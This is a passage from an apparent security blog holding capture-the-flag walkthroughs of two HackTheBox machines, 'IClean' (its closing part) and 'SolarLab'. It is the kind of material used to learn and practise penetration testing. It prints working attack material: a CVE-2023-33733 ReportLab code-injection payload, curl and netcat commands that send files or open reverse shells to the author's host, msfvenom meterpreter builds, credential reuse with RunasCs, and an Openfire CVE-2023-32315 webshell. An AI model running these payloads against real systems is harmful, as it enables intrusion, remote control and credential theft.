Looking through the qpdf documentation, it seems that I&rsquo;m able to add arbitrary files as &ldquo;attachments&rdquo; to a PDF. Naturally, the first thing I tried was simply attaching the flag:
sudo qpdf --empty --add-attachment /root/root.txt -- /tmp/.Tools/out.pdf I tried checking the contents with cat. While it did contain something that looks a lot like an HTB flag (an MD5 hash), it must have just been a coincidence - perhaps some kind of checksum for the attachment&hellip;
Just to double-check, I uploaded the file to my attacker box, using simple-http-server:
curl -X POST -F &#34;file=@/tmp/.Tools/out.pdf&#34; http://10.10.14.39:8000 But, when opening the file, it just appears blank. Checking the file contents with hexedit didn&rsquo;t help: all I found were the same two hashes from earlier.
I&rsquo;ll try again, but this time starting with a blank PDF file (as opposed to the --empty flag).
sudo qpdf --empty --pages . 1 -- /tmp/.Tools2/blank.pdf sudo qpdf /tmp/.Tools2/blank.pdf --add-attachment=/root/root.txt /tmp/.Tools2/out_with_attachment.pdf This produced the same result, but with some extra data inside.
&#x1f4a1; A little more searching through the documentation brought me to exactly what I needed; there&rsquo;s an extra switch --qdf that makes the resulting PDF parsable by a plaintext editor (like cat):
sudo qpdf --empty --qdf --add-attachment /root/root.txt -- /tmp/.Tools2/out2.pdf curl -X POST -F &#34;File=@/tmp/.Tools2/out2.pdf&#34; http://10.10.14.39:8000 &#x261d;&#xfe0f; Note the placement of the --qdf switch. It needs to go in that position. qpdf is fussy about argument sequence.
Now, taking a look at the file, I found what I was looking for! This is the file contents, viewed from hexedit:
&#x1f44f; Look familiar? That&rsquo;s the flag, between stream and endstream! Copy it out and submit it for the remainder of this box&rsquo;s points &#x1f601;
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker It&rsquo;s a good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f916; Automate blind attacks. You&rsquo;ll save a lot of time through a little scripting when testing for a blind attack. This is especially important if the thing you&rsquo;re testing for isn&rsquo;t actually there. You could otherwise spend an indefinite amount of time trying every trick in the book, only to lead to no result. Better to simply spend the time to automate the process. Plus, a little coding practice is never bad.
&#x1f4cd; Test every user-controllable input. Some inputs may seem unimportant at first, but those inputs may end up being the ones that developers accidentally overlooked when designing security! When testing for a particular vulnerability, it&rsquo;s important to create a replicable test case where you know what to expect for positive vs. negative results, that you can apply systematically to every user-controllable input.
&#x1f4c4; PDFs can be an XXE target. The same principles apply to PDFs as many other XML-based formats. We can still use them to load external resources, and that can local files (as attachments). The method of performing data exfiltration is quite different from many XXEs, but the principle is the same.
Defender &#x1f3e0; Practice safe cookies. In IClean, we ended up hijacking the session of an administrator through XSS. One thing that would have made this more difficult would be setting the http-only flag on the cookie. Implementing a proper CORS policy would also have prevented the way we stole the session cookie. Lastly, once we took the cookie, we were able to easily pop it into the browser and use it right away: the site could be reconfigured to have the dashboard on a separate subdomain and set the cookie scope to only be for that subdomain.
&#x1f47a; Never assume that a user-controlled input has not been tampered. The only mitigation for this type of risk is using cryptographic signatures. Without signatures, we must perform as much validation and sanitization as possible on every user-controlled value, and accept the risk that comes with it - and this should always be coupled with other mechanisms congruent with defense in depth.
&#x1f517; Trusting an application extends trust implicitly. When you provide privileged access to an application, keep in mind that you are implicitly providing privileged access to everything that application can access. This is why it is seldom a good idea to give full sudo access to anything. Instead, just make a service account and the least privileges that are necessary for it&rsquo;s functionality.
`,url:"https://4wayhandshake.github.io/walkthrough/iclean/"},"https://4wayhandshake.github.io/walkthrough/solarlab/":{title:"SolarLab",tags:["SMB","SSTI","Command Injection","Plaintext Credentials","Openfire","Credential Re-Use","Flawed Cryptography"],categories:["Walkthrough","HTB","Windows","Medium"],content:`INTRODUCTION SolarLab was released as the fourth box in HTB&rsquo;s Season V Anomalies. Although it&rsquo;s rated Medium, I would rate it more like an Easy. The box is about a company of three employees that are creating an instant messaging platform. The background is largely unimportant for the solution, though.
This box takes little to no recon. Checking the SMB share will give you want you need to get started. Reading through or spidering the initial website on port 80 will lead you towards a subdomain on another port, where you will find a nice little web challenge for exploiting inadequate input validation / sanitization and a vulnerable backend PDF-generation library. It might take a little bit of determination to find exactly the vulnerable portion of this website, but once found it is quite easy to gain RCE, and immediately after grab the user flag.
The path towards the root flag is also very easy. It starts with a pivot to the next user, from some easily-found plaintext credentials. But beware - there is a long rabbit-hole on this one! Seemingly due to a coincidence, the rabbit-hole seems very lucrative when you first find it, and it is very tempting to dive deeply into it&hellip; You&rsquo;ll be smart to take it slow and carefully evaluate each step and consider unexplored information before going too deeply into different methods of exploitation. In the end, obtaining the root flag requires little more than stumbling across an encrypted password in yet another database, then finding a way to read it.
This box wasn&rsquo;t too difficult. It was good practice for some Windows skills.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 6791/tcp open hnm Mostly typical ports. We see SMB, MSRPC, HTTP, and a more suspicious port: 6791, which Nmap has identified as &ldquo;hnm&rdquo;, or Halcyon Network Manager.
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 80/tcp open http nginx 1.24.0 |_http-title: Did not follow redirect to http://solarlab.htb/ |_http-server-header: nginx/1.24.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 6791/tcp open http nginx 1.24.0 |_http-server-header: nginx/1.24.0 |_http-title: Did not follow redirect to http://report.solarlab.htb:6791/ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2024-05-11T19:52:00 |_ start_date: N/A |_clock-skew: 2m24s Port 6791 is also running an nginx webserver - possibly the same one. It&rsquo;s at the subdomain http://report.solarlab.htb
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR Vuln scan had no meaningful results.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR UDP showed nothing in the top 100 ports.
Webserver Strategy Noting the two redirects on ports 80 and 6791 from the nmap scan, I added solarlab.htb and report.solarlab.htb to /etc/hosts and did banner grabbing on each:
DOMAIN=solarlab.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts echo &#34;$RADDR report.$DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Nginx is at version 1.24.0, which is the latest &ldquo;legacy&rdquo; version. Maybe worth looking into? That is, however, a very old version of Jquery: 10 years old&hellip; That&rsquo;s definitely worth checking &#x1f6a9;
Aside: JQuery 2.1.0 JQuery 2.1.0 is ten years old. This seems conspicuous and intentional. Snyk&rsquo;s report and NVD both show that this version could open up a webserver to XSS vulnerabilities and also prototype pollution. I&rsquo;ll keep an eye out for opportunities to utilize this.
whatweb --aggression 3 http://report.$DOMAIN:6791 A login page, using the same version of nginx (probably the same server / reverse proxy).
Next I performed vhost and subdomain enumeration. I&rsquo;ll start with the root domain, in case it&rsquo;s not just solarlab:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No result from that. I&rsquo;ll assume for now that the only root domain is solarlab.htb. I should also check the other port, but I&rsquo;m not expecting a new result there either.
ffuf -w $WLIST -u http://$RADDR:6791/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -timeout 4 -ic -ac -v As expected, no other result. Now I&rsquo;ll check for subdomains solarlab.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that either. I&rsquo;ll check if there is anython other than report.solarlab.htb on port 6791:
ffuf -w $WLIST -u http://$RADDR:6791/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 80 -o fuzzing/vhost-$DOMAIN-6791.md -of md -timeout 4 -ic -ac -v Nope! Only the one we already knew about. I&rsquo;ll move on to directory enumeration on http://solarlab.htb and http://report.solarlab.htb:6791:
DIRLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt&#34; ffuf -w $DIRLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-root-6791 -of json -timeout 4 -v FILELIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $FILELIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 -c -o ffuf-files-root-6791 -of json -e .php,.asp,.js,.html -timeout 4 -v It seems like a very typical static webste, as far as I can tell. The only notable thing was this con directory and con.html, each causing a 500 error:
Next I&rsquo;ll perform directory and file enumeration against http://report.solarlab.htb:6791/:
DIRLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt&#34; ffuf -w $DIRLIST:FUZZ -u http://report.$DOMAIN:6791/FUZZ -t 80 -c -o ffuf-directories-report-6791 -of json -timeout 4 -v FILELIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $FILELIST:FUZZ -u http://report.$DOMAIN:6791/FUZZ -t 80 -c -o ffuf-files-report-6791 -of json -e .php,.asp,.js,.html -timeout 4 -v Oh? Check out that redirect from the login page. &#x1f914; I wonder if we can play around with that parameter &#x1f6a9;
File enumeration didn&rsquo;t show anything new.
Exploring HTTP (80) As we saw earlier, there is a webserver running on port 80, with the domain solarlab.htb.
The index page seems to be a very typical landing page for a countdown to a project. It shows a countdown, the team, and a contact form.
The contact form and email entry don&rsquo;t seem to do anything. The email entry is actually hooked up to a POST, but upon trying to use it, you&rsquo;ll just get a HTTP 405 error.
Exploring HTTP (6791) Seems like a normal login page, right? It&rsquo;s not really a vulnerability per se but this login form definitely doesn&rsquo;t follow best-practices. Check out the result of trying a bogus login admin : Password123:
&#x261d;&#xfe0f; Instead of saying something generic like &ldquo;Invalid credential&rdquo;, it says &ldquo;User not found&rdquo;. That means that I might be able to enumerate a username separately from a password&hellip; Then, the brute-forcing problem reduces from O(N*M) for N usernames and M passwords to O(N+M); that&rsquo;s a huge improvement. To investigate this, I saved the above proxied request and made a custom wordlist of usernames:
cd /home/kali/Tools/username-anarchy ./username-anarchy Alexander Knight &gt;&gt; ~/Box_Notes/SolarLab/fuzzing/usernames.txt ./username-anarchy Claudia Springer &gt;&gt; ~/Box_Notes/SolarLab/fuzzing/usernames.txt ./username-anarchy Blake Byte &gt;&gt; ~/Box_Notes/SolarLab/fuzzing/usernames.txt USERS=~/Box_Notes/SolarLab/fuzzing/usernames.txt ffuf -w $USERS:USER -request login_post.raw -d &#34;username=USER&amp;password=Password123&#34; -c -v -fr &#39;User not found&#39; Wow, that&rsquo;s great - got all three of them! I&rsquo;ll look into brute-forcing passwords on these usernames as a last resort &#x1f6a9;
Let&rsquo;s try tossing sqlmap at it, just to see what happens:
sqlmap -u &#34;http://report.solarlab.htb:6791/login&#34; --data &#34;username=admin&amp;password=Password123&#34; --random-agent --level=3 --risk=2 --batch No luck, it didn&rsquo;t find anything.
Exploring SMB (139, 445) Let&rsquo;s try connecting to SMB and see if there&rsquo;s anything we can read with anonymous credentials:
ADMIN$, C$ and IPC$ are always there, but the Documents share definitely looks interesting - let&rsquo;s connect to that share:
Whoa! There&rsquo;s some juicy-looking documents inside there. I&rsquo;ll take a look at those as soon as I&rsquo;m done looking through this share. What about that concepts directory?
A couple more files in there. Let&rsquo;s take a look at all those files we just downloaded:
details-file.xlsx &#x1f606; Oh man&hellip; you must be joking! If those are their actual passwords, then we just found three credentials:
alexanderk : danenacia9234n blakeb : ThisCanB3typedeasily1@ claudias : dadsfawe9dafkn &#x261d;&#xfe0f; I&rsquo;m inferring usernames based on the username enumeration I performed earlier
Once I&rsquo;m done looking through these documents, I&rsquo;ll try those credentials with the RPC port and at report.solarlab.htb&#x1f6a9;
The other three documents that I obtained were just normal forms and templates. Nothing special. They didn&rsquo;t seem to hold any important info, either.
FOOTHOLD RPC port 135 Hacktricks mentioned that, with valid credentials, we can obtain RCE by using the impacket-dcomexec tool for port 135. I tried it on the target; as suggested, I tried all three &ldquo;object&rdquo; values:
impacket-dcomexec blakeb@$RADDR impacket-dcomexec -object ShellWindows blakeb@$RADDR impacket-dcomexec -object ShellBrowserWindow blakeb@$RADDR impacket-dcomexec -object MMC20 blakeb@$RADDR All resulted in the same message: Unknown DCE RPC fault status code: 00000721.
report.solarlab.htb Dashboard I&rsquo;ll try each of the credentials I found to log into the dashboard. My hope is that blakeb will have a login, as a developer.
&#x274e; alexanderk (tried all 4 passwords) &#x2705; blakeb : ThisCanB3typedeasily1@ works for logging into the dashboard &#x274e; claudias The dashboard itself is just four buttons. There is, however, a message at the top that emphasizes how secure this site is:
Each of those four buttons brings you to a form. Each of those forms seem functionally identical - as an example, here&rsquo;s the Leave Request:
Ooooh! Lots to play with on this form. There&rsquo;s also a file upload. Also, this form seems to suggest that our inputs will become inputs to a PDF document (generated on the server).
Let&rsquo;s try proxying the PDF generation. The headers might hold some useful info. For what it&rsquo;s worth, the PDF generation does indeed work, and contains our uploaded file:
The response to the proxied request (the PDF document) looks like this:
HTTP/1.1 200 OK Server: nginx/1.24.0 Date: Sat, 11 May 2024 23:13:57 GMT Content-Type: application/pdf Content-Length: 313992 Connection: keep-alive Cache-Control: no-cache Content-Disposition: inline; filename=output.pdf Vary: Cookie %PDF-1.4 % ReportLab Generated PDF document http://www.reportlab.com 1 0 obj ... Aha, so it&rsquo;s generated by ReportLab. Their official site is here. A quick google search for &ldquo;reportlab exploit vulnerability cve&rdquo; brought me straight to a Github repo describing their research (CVE-2023-33733) and PoC for exploiting this PDF library. That&rsquo;s a great sign - let&rsquo;s see if we can turn this into RCE.
USER FLAG CVE-2023-33733 The PoC code is very simple. The short answer is that I need to inject the following into a paragraph that finds its way into the PDF. Where? I&rsquo;m not sure yet&hellip;
&lt;para&gt; &lt;font color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;touch /tmp/exploited&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt; exploit &lt;/font&gt; &lt;/para&gt; Obviously, the touch /tmp/exploited part will need to be swapped-out. I&rsquo;ll try variants with nc, wget, curl and powershell to see if I can get it to contact an HTTP server on my end. First though, I&rsquo;ll need to start up a listener:
&#x1f447; I&rsquo;m using my own tool, simple-http-server. It&rsquo;s just a slight improvement on Python http.server, a lot like a PHP server, but with a few advantages for file upload and data exfiltration using base64.
sudo ufw allow from $RADDR to any port 8000,8001 proto tcp cd www # ...just contains a simple index.html nc -lvnp 8001 &amp; simple-server 8000 -v Next, let&rsquo;s craft a payload. I&rsquo;ll use the sample payload from the PoC, but exchange the shell command:
nc 10.10.14.50 8001 wget http://10.10.14.50:8000/?f=wget curl http://10.10.14.50:8000/?f=curl powershell Invoke-WebRequest -Uri http://10.10.14.50:8000/?f=powershell certutil -urlcache -f &#34;http://10.10.14.50:8000/?f=certutil&#34; response.txt I&rsquo;ll use each of those payloads, and try embedding it in various fields on the form:
&lt;para&gt; &lt;font color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;nc 10.10.14.50 8001&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt; exploit &lt;/font&gt; &lt;/para&gt; It&rsquo;s probably worth checking this on each of the four forms that are provided: Leave request, Training request, Home office request, and Travel approval.
We saw from the form that all of the fields available to us are reflected within the PDF.
The Date field seems like it gets processed by the server before it&rsquo;s rendered, so that&rsquo;s not ideal. The Phone number gets reflected to the PDF, but seems to have frontend validation on it. Didn&rsquo;t test if there is any kind of backend validation on it yet. The Justification field seems to be free-form text, and looks like it accomodates plenty of formats. That&rsquo;s good - if the developer didn&rsquo;t use a robust library for formatted text, then we may be able to sneak the payload past any validation or sanitization on this field. The Signature expects a picture, but again this is not insurmountable. Before I dive into embedding the payload within an image file, I should try the other options first. &#x1f914; Ordered from easiest to hardest (to use for an exploit), I think it&rsquo;s probably Justification, Phone, then Signature fields.
Taking all of the above forms and sequencing of fields to try, I&rsquo;ll start with the Leave Request:
However, it seems that the payload is actually substantially larger than the maximum characters. Are all of the forms limited like this?
Well, they all have that on the big text-edit field, and all of those fields have a character limit&hellip; but actually Home office request and Travel approval forms each have a text field aside from the big text-edit field (Home office address and Travel destination respectively). They also have a max number of characters, but I&rsquo;ll just remove that from the DOM itself:
Then I can easily fit the payload inside the address field:
I proxied the request to examine it using ZAP. Thankfully, there appears to be no anti-CSRF token or anything, so I can freely just toss the request into the Requester tab and try different payloads &#x1f917;
While on the Home office request form, using the address field, and using the curl payload, I got the target to contact me! &#x1f389; That proves we have RCE on the target.
Next, let&rsquo;s try to turn this RCE into a reverse shell
sudo ufw allow from $RADDR to any port 4444 proto tcp rlwrap nc -lvnp 4444 Then I tried the same as above, but with a nc payload:
nc 10.10.14.50 4444 -e cmd.exe &hellip;However, I didn&rsquo;t get any result. Same as if I didn&rsquo;t use the -e argument at all. Perhaps the target doesn&rsquo;t have nc available? &#x1f914;
Let&rsquo;s take a step back and think. I&rsquo;ve already proven that the target will connect to my HTTP server, so I have a few options to get around this:
Serve the target a copy of nc.exe then use a payload with a relative path to the executable Serve the target a self-contained reverse shell exe in one request, then run that reverse shell. Many other options Either way, the second way seems slightly easier so I&rsquo;ll try that. First, generate the reverse shell exe (I&rsquo;ll do two copies, one for x86 and one for x64):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -a x64 -f exe -o reverseshell64.exe msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f exe -o reverseshell86.exe # Then close the old reverse shell listener and instead open msfconsole msfconsole &gt; use exploit/multi/handler &gt; set payload windows/x64/meterpreter/reverse_tcp &gt; set LHOST tun0 &gt; set LPORT 4444 &gt; run After several tries, I got it to work: I&rsquo;ll serve the x64 reverse shells to the target, using the following payload:
&lt;para&gt; &lt;font color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;curl -o reverseshell64.exe http://10.10.14.50:8000/reverseshell64.exe&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt; exploit &lt;/font&gt; &lt;/para&gt; With the reverse shell on the target, we just need to run it. I&rsquo;ll send another payload to get the target to run the exe we just served:
&lt;para&gt; &lt;font color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;reverseshell64.exe&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt; exploit &lt;/font&gt; &lt;/para&gt; After a couple seconds, I saw the reverse shell listener respond:
The user flag is exactly where you&rsquo;d expect:
ROOT FLAG Local enumeration: blake In my experience, I&rsquo;ve found that the best way to start enumeration is by checking the web app directory (assuming you used a web app for foothold). I used meterpreter to download the whole thing. In blake&rsquo;s Documents, we have a simple python Flask server:
The contents of app.py show that it&rsquo;s a fairly simple Flask server, and that it connects to users.db using the SQLAlchemy interface. Let&rsquo;s check out that database:
The only table, user, seems to show credentials for each of the three employees. These would be credentials to the dashboard, but I should keep them in mind in case of credential re-use.
Next lets check the users on the box:
Hmm&hellip; &ldquo;openfire&rdquo;. It&rsquo;s a bit of a stretch, but maybe that&rsquo;s related to Alexander&rsquo;s password &ldquo;HotP!fireguard&rdquo;?
Checking out Program Files shows another mention of Openfire. However, our access (as blake) is denied:
Now seems like a good time to check for credential re-use between the web app and the box itself. I&rsquo;ll use RunasCs.exe for this. Since i know the box uses SMB, that&rsquo;s probably the most convenient method of file transfer:
# Open the firewall for SMB sudo ufw allow from $RADDR to any port 139,445 proto tcp # Transfer some useful tools into the smb share cd exploit cp ~/Tools/nc.exe ~/Tools/RunasCs.exe . # Host the smb share impacket-smbserver -smb2support -username &#39;kali&#39; -password &#39;testtesttest&#39; share . # Map the SMB share to X:\\ net use x: \\\\10.10.14.50\\share /user:kali testtesttest # Check for credential re-use: X:\\RunasCs.exe openfire HotP!fireguard &#34;whoami&#34; Nice! That&rsquo;s successful. Let&rsquo;s now open up a reverse shell as openfire instead:
sudo ufw allow from $RADDR to any port 4445,4446 proto tcp rlwrap nc -lvnp 4445 I opened an extra port, in case we end up getting to nt authority/system &#x1f91e;
cd C:\\Users\\Public\\Downloads copy X:\\nc.exe X:\\RunasCs.exe openfire HotP!fireguard &#34;C:\\Users\\Public\\Downloads\\nc.exe 10.10.14.50 4445 -e cmd.exe&#34; -t 0 After a moment, we have a reverse shell as openfire:
&#x1f911; Great! just pivoted to the next user
Local enumeration: openfire Now that I have a shell as openfire, let&rsquo;s go check out that directory in Program Files that we were locked out of. It seems like a normal/large-sized application, so I decided to copy the whole thing over SMB to examine it from my attacker box.
net use x: \\\\10.10.14.50\\share /user:kali testtesttest cd &#34;C:\\Program Files&#34; xcopy Openfire X:\\Openfire /E /H /I /Y While that was copying, I started reading up on this &ldquo;openfire&rdquo; thing.
According to the official website: &ldquo;Openfire is a powerful instant messaging (IM) and chat server that implements the XMPP protocol.&rdquo;
A little further down, there&rsquo;s a hint at something that could have easily been misconfigured:
&ldquo;Since 4.1.5 Openfire installs and runs the service automatically (also opens the browser and loads the web setup page). The launcher (if one wants to use it) is also made to run in elevated mode, so one don&rsquo;t need to run it as administrator manually. But you shouldn&rsquo;t use the launcher, if the service is running. Because this will create a conflict.&rdquo;
That same page also seems to suggest that there might be an admin console running on ports 9000 (http) and 9001 (https). A quick check of netstat seemingly shows that to be false, but I do see 9090 and 9091&hellip;
Openfire vulnerability research &#x1f6ab; This was not useful. This part is interesting if you want to see how Openfire can be exploited, but if you&rsquo;re short on time just skip to the section where I got back on track.
I&rsquo;ll check online to see if there are any obvious vulnerabilities for this software. A google search for &ldquo;Openfire vulnerability exploit CVE&rdquo; gave a lot of results. Very prominently, there were several mentions of CVE-2023-32315. Apparently, there is a path traversal in the admin dashboard. Could this be used for privesc? Possibly &#x1f937;&zwj;&#x2642;&#xfe0f;
The CVE affects versions prior to 4.7.5, and according to changelog.html in the program directory, the installed version is 4.7.4 &#x1f44d; I saw two PoC exploits on github for this CVE: one by K3ysTr0K3R and another by miko550. For more context on those PoCs, this article does a really good job of explaining exactly howt he vulnerability can be exploited. In the miko550 PoC, the admin dashboard gains a webshell (as a malicious plugin), so we can use this for RCE.
I found some more recent information about Openfire, this time from HackTheBox itself! The article is about CVE-2024-25420 and CVE-2024-25421, and was only written 1.5 months ago. It&rsquo;s about improper creation and deletion of admin users. By itself, it won&rsquo;t lead to RCE. However, it may aid in creating an admin user to exploit CVE-2023-32315
Accessing Openfire dashboard &#x1f6ab; This was not useful. This part is interesting if you want to see how Openfire can be exploited, but if you&rsquo;re short on time just skip to the section where I got back on track.
Both PoC exploits look like they require access to the admin dashboard for Openfire. I think the best way to gain access is to set up a socks5 proxy - for that, I&rsquo;ll use chisel:
sudo ufw allow from $RADDR to any port 9999 proto tcp cp ~/Tools/WINDOWS/chisel.exe ./exploit # copy chisel to the SMB share /home/kali/Tools/STAGING/chisel server --port 9999 --reverse &amp; cd C:\\Users\\openfire\\Downloads copy X:\\chisel.exe start /b chisel.exe client 10.10.14.50:9999 R:1080:socks OK the proxy should be established. Let&rsquo;s do a quick round-trip test using it; I&rsquo;ll request the index page of the http server I&rsquo;m running from my attacker box:
Looks good. Now let&rsquo;s see if that admin dashboard is running on 9090. If my assumption is correct, 9090 should have HTTP and 9091 should be HTTPS.
Confirmed! The Openfire admin dashboard is indeed running on that pair of ports. We don&rsquo;t currently have a login for this dashboard, but that&rsquo;s exactly what those two PoC scripts for CVE-2023-32315 do!
git clone https://github.com/miko550/CVE-2023-32315.git miko550 cd miko555 python3 -m venv . source bin/activate pip3 install -r requirements.txt proxychains python3 CVE-2023-32315.py -t http://localhost:9090 Perfect. Thanks miko550! Anyone reading this should go give their repo a star.
CVE-2023-32315 for RCE &#x1f6ab; This was not useful. This part is interesting if you want to see how Openfire can be exploited, but if you&rsquo;re short on time just skip to the section where I got back on track.
Following the instructions from the PoC README, we end up accessing a webshell by installing an extra plugin for the dashbowrd (provided in the repo). Go to the plugins tab:
Upload the provided plugin, openfire-management-tool-plugin.jar:
We can utilize the new plugin by going to Server &gt; Server Management &gt; Management Tool and logging in with password 123:
We can access the webshell by choosing system command from the dropdown menu:
The page loads are very slow on this dashboard (probably due to the proxy?), so I want to prepare everything such that it requires as little interaction from the webshell as possible. As such, I&rsquo;ll prepare a reverse shell using msfvenom again and place it in C:\\Users\\Public\\Downloads so any user can access it.
cd ./exploit # move to the SMB share msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=4447 -a x64 -f exe -o reverseshell4447.exe sudo ufw allow from $RADDR to any port 4447 msfconsole &gt; use exploit/multi/handler &gt; set LHOST tun0 &gt; set LPORT 4447 &gt; run Now using one of the other reverse shells I already have open, let&rsquo;s put the reverse shell in position:
cd C:\\Users\\Public\\Downloads copy X:\\reverseshell4447.exe Everything is ready. Let&rsquo;s utilize this webshell! Just to test, I&rsquo;ll try whoami first:
&#x1f61e; Oh, right. I should have expected that. Of course the Openfire application is running as openfire - duh! OK, I&rsquo;ll have to find a way to escalate privilege.
Making a new Openfire admin &#x1f6ab; This was not useful. This part is interesting if you want to see how Openfire can be exploited, but if you&rsquo;re short on time just skip to the section where I got back on track.
However, we&rsquo;re not entirely out of luck! Remember those other two CVEs, the more recent ones shown in that HackTheBox article? One was CVE-2024-25420. While it&rsquo;s not actually related to the CVE, that article shows that we can create a new user and grant them admin access. Perhaps this will be enough for privilege escalation?
I&rsquo;ve created a new user jimbob : dove-birb-987 with admin access, hopefully. Lets logout then log in as jimbob.
Conventiently, the dashboard still has the plugin from the miko550 CVE-2023-32315 PoC still enabled. Let&rsquo;s try using it; I&rsquo;ll open a reverse shell:
sudo ufw allow from $RADDR to any port 4448 proto tcp rlwrap nc -lvnp 4448 Seems to have worked, although this shell is still actually just openfire:
&#x1f914; Interestingly, I do seem to have a new set of privileges. In the other reverse shells, blake and openfire both have these privileges:
According to Microsoft, SeCreateGlobalPrivilege is for this:
The user right is required for a user account to create global file mapping and symbolic link objects. Note that users can still create session-specific objects without being assigned this user right. By default, members of the Administrators group, the System account, and Services that are started by the Service Control Manager are assigned the &ldquo;Create global objects&rdquo; user right.
Unclear how I might utilize that. Make a link to the flag? This might be a dead-end. I&rsquo;ll keep searching for other clues, and come back to this if I get desparate &#x1f6a9;
Openfire Program Files I hadn&rsquo;t yet looked through all of the Openfire directory that I downloaded, so I browsed through it manually for a bit. Very quickly, I found an intersting-sounding subdirectory called embedded-db:
openfire.script appears to be a database initialization script. Inside, we see a hashed credential being stored:
